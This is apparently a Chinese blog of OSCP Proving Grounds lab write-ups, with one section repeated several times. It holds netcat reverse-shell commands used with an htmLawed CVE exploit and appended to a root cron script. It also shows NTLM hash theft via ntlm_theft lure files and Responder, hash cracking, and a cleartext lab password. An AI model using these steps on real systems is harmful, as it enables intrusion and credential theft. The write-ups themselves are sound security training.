<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>只有一个root账户</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>上传linpeas执行，可能有用的信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Sudo version</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#sudo-version</span></span><br><span class="line">Sudo version <span class="number">1.9</span><span class="number">.5</span>p2</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Checking sudo tokens</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#reusing-sudo-tokens</span></span><br><span class="line">ptrace protection <span class="keyword">is</span> disabled (<span class="number">0</span>), so sudo tokens could be abused</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ .sh files <span class="keyword">in</span> path</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#scriptbinaries-in-path</span></span><br><span class="line">/usr/<span class="built_in">bin</span>/gettext.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Writable log files (logrotten) (limit <span class="number">50</span>)</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#logrotate-exploitation</span></span><br><span class="line">logrotate <span class="number">3.18</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">    Default mail command:       /usr/<span class="built_in">bin</span>/mail</span><br><span class="line">    Default compress command:   /<span class="built_in">bin</span>/gzip</span><br><span class="line">    Default uncompress command: /<span class="built_in">bin</span>/gunzip</span><br><span class="line">    Default compress extension: .gz</span><br><span class="line">    Default state file path:    /var/lib/logrotate/status</span><br><span class="line">    ACL support:                yes</span><br><span class="line">    SELinux support:            yes</span><br></pre></td></tr></table></figure>

<p>试了sudo 提权，没有成功，其他也没有头绪，先用pspy检查一下有没有其他定时任务</p>
<blockquote>
<p><a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a></p>
</blockquote>
<p>pspy可以在不需要root权限的情况下监控进程执行情况，尤其适用于检查进程执行时间短，使用ps -ef等命令无法查看到的场景。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-74.png.png"></p>
<p>监控到每分钟会以root用户执行 <code>/var/www/clean.sh</code>，查看clean.sh内容是清理apach日志，查看所属用户是当前用户www-data, 直接追加反弹shell命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat cleanup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">rm -rf /var/log/apache2/error.log</span><br><span class="line">rm -rf /var/log/apache2/access.log</span><br><span class="line">ls -al cleanup.sh</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> www-data www-data <span class="number">82</span> Aug <span class="number">25</span>  <span class="number">2023</span> cleanup.sh</span><br><span class="line">echo <span class="string">&#x27;nc 192.168.45.234 80 -e /bin/bash&#x27;</span> &gt;&gt; cleanup.sh</span><br></pre></td></tr></table></figure>

<p>等待片刻，nc收到了root用户的反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.190</span>] <span class="number">45784</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>

<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>可能的提权点和漏洞比较多，先枚举列出来，从最有可能的开始，避免浪费太多时间，也避免有重要信息遗漏</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--Modified version while processing--&gt;</span><br><span class="line"># Difficulty</span><br><span class="line"></span><br><span class="line">Medium</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># scan</span><br><span class="line"></span><br><span class="line">```JSON</span><br><span class="line">[*] ssh found on tcp/22.</span><br><span class="line">    OpenSSH 8.4p1</span><br><span class="line"></span><br><span class="line">[*] http found on tcp/80.</span><br><span class="line">    Apache/2.4.56</span><br></pre></td></tr></table></figure>

<h1 id="80-htmlLaw-1"><a href="#80-htmlLaw-1" class="headerlink" title="80 htmlLaw"></a>80 htmlLaw</h1><p>版本：1.2.5</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-75.png.png"></p>
<h1 id="foothold-1"><a href="#foothold-1" class="headerlink" title="foothold"></a>foothold</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-77.png.png"></p>
<blockquote>
<p><a href="https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py">https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py</a></p>
</blockquote>
<p>执行 <code>python cve-2022-35914.py -u</code> <code>http://192.168.212.190</code> <code>-c &quot;id&quot;</code> 后提示失败，查看代码修改默认uri为 <code>/index.php</code>,重新执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url,cmd,user_agent,check,hook</span>):</span><br><span class="line">    <span class="comment"># uri = &quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;/index.php&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: user_agent&#125;</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    response_part1 = session.get(<span class="built_in">str</span>(url)+uri, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response_part1.text)</span><br><span class="line">    <span class="keyword">if</span> (response_part1.status_code != <span class="number">200</span>):</span><br><span class="line">        fail()</span><br></pre></td></tr></table></figure>

<p>重新执行成功得到返回</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-76.png.png"></p>
<p>直接尝试nc 反弹shell: <code>python cve-2022-35914.py -u</code> <code>http://192.168.212.190</code> <code>-c &quot;nc 192.168.45.234 80 -e /bin/bash</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">80</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.190</span><span class="punctuation">]</span> <span class="number">60626</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<h1 id="escalation-1"><a href="#escalation-1" class="headerlink" title="escalation"></a>escalation</h1><p>只有一个root账户</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>上传linpeas执行，可能有用的信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Sudo version</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#sudo-version</span></span><br><span class="line">Sudo version <span class="number">1.9</span><span class="number">.5</span>p2</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Checking sudo tokens</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#reusing-sudo-tokens</span></span><br><span class="line">ptrace protection <span class="keyword">is</span> disabled (<span class="number">0</span>), so sudo tokens could be abused</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ .sh files <span class="keyword">in</span> path</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#scriptbinaries-in-path</span></span><br><span class="line">/usr/<span class="built_in">bin</span>/gettext.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Writable log files (logrotten) (limit <span class="number">50</span>)</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class="comment">#logrotate-exploitation</span></span><br><span class="line">logrotate <span class="number">3.18</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">    Default mail command:       /usr/<span class="built_in">bin</span>/mail</span><br><span class="line">    Default compress command:   /<span class="built_in">bin</span>/gzip</span><br><span class="line">    Default uncompress command: /<span class="built_in">bin</span>/gunzip</span><br><span class="line">    Default compress extension: .gz</span><br><span class="line">    Default state file path:    /var/lib/logrotate/status</span><br><span class="line">    ACL support:                yes</span><br><span class="line">    SELinux support:            yes</span><br></pre></td></tr></table></figure>

<p>试了sudo 提权，没有成功，其他也没有头绪，先用pspy检查一下有没有其他定时任务</p>
<blockquote>
<p><a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a></p>
</blockquote>
<p>pspy可以在不需要root权限的情况下监控进程执行情况，尤其适用于检查进程执行时间短，使用ps -ef等命令无法查看到的场景。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-74.png.png"></p>
<p>监控到每分钟会以root用户执行 <code>/var/www/clean.sh</code>，查看clean.sh内容是清理apach日志，查看所属用户是当前用户www-data, 直接追加反弹shell命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat cleanup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">rm -rf /var/log/apache2/error.log</span><br><span class="line">rm -rf /var/log/apache2/access.log</span><br><span class="line">ls -al cleanup.sh</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> www-data www-data <span class="number">82</span> Aug <span class="number">25</span>  <span class="number">2023</span> cleanup.sh</span><br><span class="line">echo <span class="string">&#x27;nc 192.168.45.234 80 -e /bin/bash&#x27;</span> &gt;&gt; cleanup.sh</span><br></pre></td></tr></table></figure>

<p>等待片刻，nc收到了root用户的反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.190</span>] <span class="number">45784</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>

<h1 id="反思-1"><a href="#反思-1" class="headerlink" title="反思"></a>反思</h1><ol>
<li>可能的提权点和漏洞比较多，先枚举列出来，从最有可能的开始，避免浪费太多时间，也避免有重要信息遗漏</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Nara</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>easy</p>
<h1 id="categories"><a href="#categories" class="headerlink" title="categories"></a>categories</h1><p>AD</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-21.png.png"></p>
<h2 id="53-dig-axfr"><a href="#53-dig-axfr" class="headerlink" title="53 dig axfr"></a>53 dig axfr</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">dig</span> <span class="string">AXFR</span> <span class="string">-p</span> <span class="number">53</span> <span class="string">@192.168.178.30</span></span><br><span class="line"><span class="string">;;</span> <span class="string">communications</span> <span class="string">error</span> <span class="string">to</span> <span class="number">192.168</span><span class="number">.178</span><span class="number">.30</span><span class="comment">#53: timed out</span></span><br><span class="line"></span><br><span class="line"><span class="string">;</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">DiG</span> <span class="number">9.20</span><span class="number">.2</span><span class="number">-1</span><span class="string">-Debian</span> <span class="string">&lt;&lt;&gt;&gt;</span> <span class="string">AXFR</span> <span class="string">-p</span> <span class="number">53</span> <span class="string">@192.168.178.30</span></span><br><span class="line"><span class="string">;</span> <span class="string">(1</span> <span class="string">server</span> <span class="string">found)</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">global options:</span> <span class="string">+cmd</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">Query time:</span> <span class="number">4718 </span><span class="string">msec</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">SERVER:</span> <span class="number">192.168</span><span class="number">.178</span><span class="number">.30</span><span class="comment">#53(192.168.178.30) (UDP)</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">WHEN:</span> <span class="string">Sat</span> <span class="string">Mar</span> <span class="number">15</span> <span class="number">09</span><span class="string">:20:53</span> <span class="string">CST</span> <span class="number">2025</span></span><br><span class="line"><span class="string">;;</span> <span class="attr">MSG SIZE  rcvd:</span> <span class="number">28</span>          </span><br></pre></td></tr></table></figure>

<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">ldapsearch</span> <span class="string">-H</span> <span class="string">ldap://192.168.178.30</span> <span class="string">-x</span> <span class="string">-b</span> <span class="string">&quot;DC=nara-security,DC=com&quot;</span> <span class="string">|tee</span> <span class="string">ldap_dump</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;DC=nara-security,DC=com&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line"><span class="attr">search:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">result:</span> <span class="number">1</span> <span class="string">Operations</span> <span class="string">error</span></span><br><span class="line"><span class="attr">text: 000004DC: LdapErr:</span> <span class="string">DSID-0C090AC9,</span> <span class="attr">comment:</span> <span class="string">In</span> <span class="string">order</span> <span class="string">to</span> <span class="string">perform</span> <span class="string">this</span> <span class="string">opera</span></span><br><span class="line"> <span class="string">tion</span> <span class="string">a</span> <span class="string">successful</span> <span class="string">bind</span> <span class="string">must</span> <span class="string">be</span> <span class="string">completed</span> <span class="string">on</span> <span class="string">the</span> <span class="string">connection.,</span> <span class="string">data</span> <span class="number">0</span><span class="string">,</span> <span class="string">v4f7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 1</span></span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">smbclient</span> <span class="string">-L</span> <span class="string">//192.168.178.30</span> <span class="string">-N</span></span><br><span class="line"></span><br><span class="line">        <span class="string">Sharename</span>       <span class="string">Type</span>      <span class="string">Comment</span></span><br><span class="line">        <span class="string">---------</span>       <span class="string">----</span>      <span class="string">-------</span></span><br><span class="line">        <span class="string">ADMIN$</span>          <span class="string">Disk</span>      <span class="string">Remote</span> <span class="string">Admin</span></span><br><span class="line">        <span class="string">C$</span>              <span class="string">Disk</span>      <span class="string">Default</span> <span class="string">share</span></span><br><span class="line">        <span class="string">IPC$</span>            <span class="string">IPC</span>       <span class="string">Remote</span> <span class="string">IPC</span></span><br><span class="line">        <span class="string">nara</span>            <span class="string">Disk</span>      <span class="string">company</span> <span class="string">share</span></span><br><span class="line">        <span class="string">NETLOGON</span>        <span class="string">Disk</span>      <span class="string">Logon</span> <span class="string">server</span> <span class="string">share</span> </span><br><span class="line">        <span class="string">SYSVOL</span>          <span class="string">Disk</span>      <span class="string">Logon</span> <span class="string">server</span> <span class="string">share</span> </span><br><span class="line"><span class="string">^[[AReconnecting</span> <span class="string">with</span> <span class="string">SMB1</span> <span class="string">for</span> <span class="string">workgroup</span> <span class="string">listing.</span></span><br><span class="line"><span class="attr">do_connect:</span> <span class="string">Connection</span> <span class="string">to</span> <span class="number">192.168</span><span class="number">.178</span><span class="number">.30</span> <span class="string">failed</span> <span class="string">(Error</span> <span class="string">NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span></span><br><span class="line"><span class="string">Unable</span> <span class="string">to</span> <span class="string">connect</span> <span class="string">with</span> <span class="string">SMB1</span> <span class="string">--</span> <span class="literal">no</span> <span class="string">workgroup</span> <span class="string">available</span></span><br></pre></td></tr></table></figure>

<p>get Important.txt</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">smbclient</span> <span class="string">//192.168.178.30/nara</span> <span class="string">-N</span></span><br><span class="line"><span class="string">Try</span> <span class="string">&quot;help&quot;</span> <span class="string">to</span> <span class="string">get</span> <span class="string">a</span> <span class="string">list</span> <span class="string">of</span> <span class="string">possible</span> <span class="string">commands.</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\&gt;</span> <span class="string">ls</span></span><br><span class="line">  <span class="string">.</span>                                   <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:31:58</span> <span class="number">2023</span></span><br><span class="line">  <span class="string">..</span>                                <span class="string">DHS</span>        <span class="number">0</span>  <span class="string">Sat</span> <span class="string">Mar</span> <span class="number">15</span> <span class="number">09</span><span class="string">:18:08</span> <span class="number">2025</span></span><br><span class="line">  <span class="string">Documents</span>                           <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:03:13</span> <span class="number">2023</span></span><br><span class="line">  <span class="string">Important.txt</span>                       <span class="string">A</span>     <span class="number">2200  </span><span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:05:31</span> <span class="number">2023</span></span><br><span class="line">  <span class="string">IT</span>                                  <span class="string">D</span>        <span class="number">0</span>  <span class="string">Mon</span> <span class="string">Jul</span> <span class="number">31</span> <span class="number">00</span><span class="string">:22:50</span> <span class="number">2023</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7699711</span> <span class="string">blocks</span> <span class="string">of</span> <span class="string">size</span> <span class="number">4096. </span><span class="number">4153067</span> <span class="string">blocks</span> <span class="string">available</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\&gt;</span> <span class="string">get</span> <span class="string">Important.txt</span> </span><br><span class="line"><span class="string">getting</span> <span class="string">file</span> <span class="string">\Important.txt</span> <span class="string">of</span> <span class="string">size</span> <span class="number">2200 </span><span class="string">as</span> <span class="string">Important.txt</span> <span class="string">(2.9</span> <span class="string">KiloBytes/sec)</span> <span class="string">(average</span> <span class="number">2.9</span> <span class="string">KiloBytes/sec)</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\&gt;</span> <span class="string">cd</span> <span class="string">Documents\</span></span><br><span class="line"><span class="attr">lssmb:</span> <span class="string">\Documents\&gt;</span> <span class="string">ls</span></span><br><span class="line">  <span class="string">.</span>                                   <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:03:13</span> <span class="number">2023</span></span><br><span class="line">  <span class="string">..</span>                                  <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:31:58</span> <span class="number">2023</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7699711</span> <span class="string">blocks</span> <span class="string">of</span> <span class="string">size</span> <span class="number">4096. </span><span class="number">4152768</span> <span class="string">blocks</span> <span class="string">available</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\Documents\&gt;</span> <span class="string">cd</span> <span class="string">..</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\&gt;</span> <span class="string">cd</span> <span class="string">IT</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\IT\&gt;</span> <span class="string">ls</span></span><br><span class="line">  <span class="string">.</span>                                   <span class="string">D</span>        <span class="number">0</span>  <span class="string">Mon</span> <span class="string">Jul</span> <span class="number">31</span> <span class="number">00</span><span class="string">:22:50</span> <span class="number">2023</span></span><br><span class="line">  <span class="string">..</span>                                  <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sun</span> <span class="string">Jul</span> <span class="number">30</span> <span class="number">22</span><span class="string">:31:58</span> <span class="number">2023</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7699711</span> <span class="string">blocks</span> <span class="string">of</span> <span class="string">size</span> <span class="number">4096. </span><span class="number">4152768</span> <span class="string">blocks</span> <span class="string">available</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\IT\&gt;</span> <span class="string">exit</span></span><br><span class="line">         </span><br></pre></td></tr></table></figure>

<p>提示员工要经常检查shared documents下的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat Important.txt </span><br><span class="line">Dear Team,</span><br><span class="line"></span><br><span class="line">We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action.</span><br><span class="line"></span><br><span class="line">The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don&#x27;t miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible.</span><br><span class="line"></span><br><span class="line">Here are a few simple steps to stay up-to-date and ensure timely actions:</span><br><span class="line"></span><br><span class="line">* Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance.</span><br><span class="line"></span><br><span class="line">* Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment.</span><br><span class="line"></span><br><span class="line">* Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it&#x27;s a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly.</span><br><span class="line"></span><br><span class="line">* Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don&#x27;t hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It&#x27;s essential that you fully understand what&#x27;s required before proceeding.</span><br><span class="line"></span><br><span class="line">Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success.</span><br><span class="line"></span><br><span class="line">Thank you for your attention to this matter, and if you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team.   </span><br></pre></td></tr></table></figure>

<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h2 id="smb-html-steal"><a href="#smb-html-steal" class="headerlink" title="smb html steal"></a>smb html steal</h2><p>smbclient put test.txt 发现有上传文件权限, 使用ntlm-theft.py生成 lnk文件，上传到documents文件夹下，等待倒霉蛋点击执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s 192.168.45.241 -f <span class="built_in">test</span></span><br><span class="line">Created: <span class="built_in">test</span>/test.scf (BROWSE TO FOLDER)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(url).url (BROWSE TO FOLDER)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(icon).url (BROWSE TO FOLDER)</span><br><span class="line">Created: <span class="built_in">test</span>/test.lnk (BROWSE TO FOLDER)</span><br><span class="line">Created: <span class="built_in">test</span>/test.rtf (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(stylesheet).xml (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(fulldocx).xml (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(includepicture).docx (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(remotetemplate).docx (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(frameset).docx (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test-(externalcell).xlsx (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.wax (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)</span><br><span class="line">Created: <span class="built_in">test</span>/test.asx (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.jnlp (OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.application (DOWNLOAD AND OPEN)</span><br><span class="line">Created: <span class="built_in">test</span>/test.pdf (OPEN AND ALLOW)</span><br><span class="line">Created: <span class="built_in">test</span>/zoom-attack-instructions.txt (PASTE TO CHAT)</span><br><span class="line">Created: <span class="built_in">test</span>/Autorun.inf (BROWSE TO FOLDER)</span><br><span class="line">Created: <span class="built_in">test</span>/desktop.ini (BROWSE TO FOLDER)</span><br><span class="line">Generation Complete.</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">smb:</span> <span class="string">\&gt;</span> <span class="string">cd</span> <span class="string">Documents\</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\Documents\&gt;</span> <span class="string">put</span> <span class="string">test.lnk</span> </span><br><span class="line"><span class="string">putting</span> <span class="string">file</span> <span class="string">test.lnk</span> <span class="string">as</span> <span class="string">\Documents\test.lnk</span> <span class="string">(3.8</span> <span class="string">kb/s)</span> <span class="string">(average</span> <span class="number">1.7</span> <span class="string">kb/s)</span></span><br><span class="line"><span class="attr">smb:</span> <span class="string">\Documents\&gt;</span> <span class="string">ls</span></span><br><span class="line">  <span class="string">.</span>                                   <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sat</span> <span class="string">Mar</span> <span class="number">15</span> <span class="number">13</span><span class="string">:48:09</span> <span class="number">2025</span></span><br><span class="line">  <span class="string">..</span>                                  <span class="string">D</span>        <span class="number">0</span>  <span class="string">Sat</span> <span class="string">Mar</span> <span class="number">15</span> <span class="number">13</span><span class="string">:42:07</span> <span class="number">2025</span></span><br><span class="line">  <span class="string">test.lnk</span>                            <span class="string">A</span>     <span class="number">2164  </span><span class="string">Sat</span> <span class="string">Mar</span> <span class="number">15</span> <span class="number">13</span><span class="string">:48:10</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7699711</span> <span class="string">blocks</span> <span class="string">of</span> <span class="string">size</span> <span class="number">4096. </span><span class="number">3506757</span> <span class="string">blocks</span> <span class="string">available</span></span><br></pre></td></tr></table></figure>

<p>kali 启动 responder, 稍等片刻获取到Tracy.White的ntlm hash</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-19.png.png"></p>
<p>使用hashcat破解 <code>hashcat white.hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-16.png.png"></p>
<p>使用用户名密码发现winrm、rdp都无法登录</p>
<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>接下来利用bloodhound-python看下有没有可以利用的点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodhound-python  -dns-tcp -ns 192.168.178.30 -d nara-security.com -u Tracy.White -p zqwj041FGX -c all</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-20.png.png"></p>
<p>把所有json文件导入bloodhound中，看看White拥有什么权限</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-22.png.png"></p>
<p>对remote access有完全控制权，按照利用方式，没有成功，</p>
<h2 id="ladpmodify"><a href="#ladpmodify" class="headerlink" title="ladpmodify"></a>ladpmodify</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> groupadd.ldif </span><br><span class="line">dn: CN=Remote Access,OU=remote,DC=nara-security,DC=com</span><br><span class="line">changetype: modify</span><br><span class="line">add: member</span><br><span class="line">member: CN=Tracy White,OU=staff,DC=nara-security,DC=com</span><br></pre></td></tr></table></figure>

<p><code>ldapmodify -x -D &quot;``Tracy.White@nara-security.com``&quot; -w zqwj041FGX -H ldap://``nara-security.com</code> <code>-f groupadd.ldif</code></p>
